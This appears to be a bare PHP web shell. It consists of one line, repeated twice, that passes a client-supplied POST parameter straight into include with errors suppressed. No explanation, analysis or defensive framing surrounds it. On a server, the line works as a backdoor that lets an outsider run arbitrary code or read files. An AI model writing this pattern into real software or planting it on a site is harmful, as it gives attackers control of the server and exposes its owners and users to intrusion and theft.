<?@include($_POST["code"]);?> 
<?@include($_POST["code"]);?>